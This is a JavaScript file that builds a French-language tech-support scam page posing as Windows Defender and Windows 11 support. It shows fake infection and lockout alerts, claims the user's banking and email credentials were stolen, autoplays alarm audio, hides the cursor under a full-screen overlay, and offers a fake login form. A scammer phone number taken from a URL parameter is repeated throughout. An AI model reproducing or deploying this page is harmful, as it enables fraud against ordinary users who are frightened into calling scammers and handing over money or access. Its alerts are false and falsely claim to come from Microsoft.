// Function to get URL parameters
function getUrlParameter(name) {
    const urlParams = new URLSearchParams(window.location.search);
    let value = urlParams.get(name) || '';
    // If value contains + signs, decode them properly
    value = value.replace(/%2B/g, '+');
    return value;
}

// Get the dynamic phone number
const phoneNumber = getUrlParameter('bcda');

document.getElementById("app").innerHTML = `
    
    <audio id="ado1">
        <source src="media/snhBDTv.mp3" type="audio/mpeg">
      </audio>
      <audio autoplay="" id="ado2">
        <source src="media/shfyBTvWR.wav" type="audio/mpeg">
      </audio>

      <a href="#" id="link_black" style="cursor:none" rel="noreferrer">
        <div class="black" style="height: 145%; cursor: none; display: block;"></div>

          <div class="bg" id="bg">
        <div class="bgimg" style="top:0">
          <img src="images/sncyBtShQ.png" alt="" width="100%">
        </div>
      </div>
      </a>
      
    
     
       



       
     

     
      <div class="cardcontainer" style="cursor: default; display: none;" id="pop_up_new">
        <p style="font-size:16px;font-weight:400;margin:0;padding:5px 10px;color:#fff!important;color:#414141;font-weight:700;margin-top:0px" class="text-center">Windows-Defender </p>
        <p>
         <b>L'accès à ce PC a été bloqué pour des raisons de sécurité</b>
         </p>
         <p>Votre ordinateur a été signalé comme étant infecté par un logiciel espion de type Trojan. Les données suivantes ont été compromises :</p>
         <p>> Identifiant e-mail <br>> Mot de passe bancaire <br>> Connexion Facebook <br>> Photos et Documents </p>
         <p>Un scan Windows Defender a détecté un logiciel publicitaire potentiellement indésirable sur cet appareil qui peut voler des mots de passe, des identités en ligne, des informations financières, des fichiers personnels, des photos et des documents. </p>
         <p>Veuillez nous contacter immédiatement. Notre ingénieur vous guidera à travers le processus de suppression par téléphone. </p>
         <p>Appelez immédiatement l'assistance Windows 11 pour signaler cette menace, prévenir le vol d'identité et débloquer l'accès à cet appareil. </p>
         <p>La fermeture de cette fenêtre peut mettre vos informations personnelles en danger et peut entraîner la suspension de votre enregistrement Windows. </p>
         <p style="padding-bottom:0;color:#fff;font-size:16px"> Veuillez appeler l'assistance Windows 11 :<strong>
            <span style="border:1px solid #fff;border-radius:5px;padding:2px 5px">  ${phoneNumber}
            </span>
          </strong>
        </p>
        <div class="action_buttons">
          <a class="active" id="leave_page" style="cursor:pointer;color:#fff!important">Autoriser</a>
          <a class="active" id="leave_page" style="color:#fff!important">Refuser</a>
        </div>
      </div>

     
      <div id="chat" style="display: none;">
        <img src="images/yhEgBt.png">
        <span style="color:#222;font-size:24px;font-weight:600;margin-left:6px;position:relative;top:5px">Windows 11</span>
        <br>
        <p>Assistance technique Windows
        </p>
        <h4 style="font-weight:600;color:#0F396D;font-size:22px">   ${phoneNumber}
          <br>(Numéro gratuit)<br><br>
        </h4>
        <div class="arrow-down">
          <svg height="1em" viewBox="0 0 320 512">
            <style>
              svg {
                fill: #fff
              }
            </style>
            <path d="M137.4 374.6c12.5 12.5 32.8 12.5 45.3 0l128-128c9.2-9.2 11.9-22.9 6.9-34.9s-16.6-19.8-29.6-19.8L32 192c-12.9 0-24.6 7.8-29.6 19.8s-2.2 25.7 6.9 34.9l128 128z"></path>
                  </svg></div>
      </div>

      <div id="login-box">
        <span style="color: #fff;
        font-size: 21px;
        font-weight: 600;
        margin-left: 6px;
        position: relative;
        top: 5px;">Alerte de sécurité Windows 11 !</span>
        <div class="mnmz1" onclick="hide1();playSound1();">
                    <p class="text-center1" style="color: red; font-size: 22px; opacity:1; font-weight: 700; ">X</p>

                  </div>

        <br>
        <br>
        <p class="text-center" style="color: #fff;  margin-top:10px; font-size: 16px; opacity:.9; ">
          Windows 11 a été verrouillé en raison d'une activité inhabituelle.
      <br>Essayez de vous reconnecter avec votre identifiant et votre mot de passe Windows 11.<br>Si vous avez besoin d'aide, contactez l'assistance Windows 11.<br><strong>${phoneNumber}		 	</strong></p>

        <form action="#">
           <input type="text" name="name" id="name" placeholder="Nom d'utilisateur" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

         <input type="text" name="name" id="name" placeholder="Mot de passe" class="text-input" required="" oninput="this.value = this.value.replace(/[^0-9.]/g, '').replace(/(\..*)\./g, '$1');"><br>

        <input type="submit" class="button1" name="Verify" value="Connexion" onclick="playSound1();">



      </form></div>

      <div id="chat-box">
      <span style="color: red;
      font-size: 24px;
      font-weight: 600;
      margin-left: 6px;
      position: relative;
      top: 5px;" class="blink3">Alerte virus 027341 !!</span>
      <div class="bhfys" onclick="hide1();playSound1();">
              <p class="text-center1" style="color: #CDCBCB; font-size: 18px; opacity:.9; ">X</p>

            </div>

      <br>
      <br>
      <p class="text-center" style="color: #CDCBCB;  margin-top:10px; font-size: 16px; opacity:.9; ">
      Windows 11 verrouillé en raison d'une activité inhabituelle.
      Erreur : Ox800xdfy

      <br>Votre système a été signalé comme étant infecté par un logiciel espion de type Trojan.<br>Pour obtenir de l'aide, contactez l'assistance Windows 11<br><strong style="font-size:24px;" class="blink1">${phoneNumber} (Ligne d'assistance) 		 	</strong></p>

      </div>

      <div id="ev_talkbox_wrapper" class="ev_talkbox_wrapper_min bounce">
      <div class="new_messg">
        <p style=" color: #fff;   margin-top: 8px;
        font-weight: 500;
        font-size: 16px;">Des questions ? Parlez à un expert</p>
      </div>
      <div id="ev_talkbox_min" class="">
        <span id="ev_min_zoimg"></span>
        <span id="ev_min_title">Chat</span>
      </div>
      </div>

      `;